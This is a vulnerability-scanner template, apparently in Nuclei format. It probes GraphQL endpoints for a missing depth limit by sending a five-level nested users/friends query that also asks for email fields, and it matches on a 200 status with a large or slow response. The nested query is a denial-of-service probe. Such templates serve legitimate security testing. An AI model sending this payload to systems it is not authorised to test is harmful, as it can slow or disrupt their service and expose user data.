id: m7-graphql-depth-limit
info:
  name: M7 - GraphQL Missing Depth Limit (Nested Query DoS)
  author: Sharlix
  severity: medium
  description: GraphQL missing depth limit allows deeply nested queries causing DoS
  tags: graphql,dos,depth,m7hunter

requests:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"

    body: '{"query":"{ users { friends { friends { friends { friends { friends { id email } } } } } } }"}'
    headers:
      Content-Type: application/json

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - "len(body) > 1000 || duration > 3"
